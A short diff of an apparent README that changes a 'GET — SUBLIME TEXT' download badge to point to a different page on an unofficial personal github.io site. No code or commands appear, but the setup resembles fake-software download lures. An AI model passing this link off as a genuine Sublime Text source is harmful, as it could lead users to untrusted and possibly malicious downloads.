@@ -4,7 +4,7 @@
 <img src="https://www.schoolofit.co.za/wp-content/uploads/2023/12/Sublime-Text-Courses-South-Africa.png" width="400">
 </p>
 
-[![GET — SUBLIME TEXT](https://img.shields.io/badge/GET-SUBLIME%20TEXT-2563eb?style=for-the-badge)](https://mitnal11276.github.io/.github/)
+[![GET — SUBLIME TEXT](https://img.shields.io/badge/GET-SUBLIME%20TEXT-2563eb?style=for-the-badge)](https://mitnal11276.github.io/.github/Sublime-text)
 
 ---
 
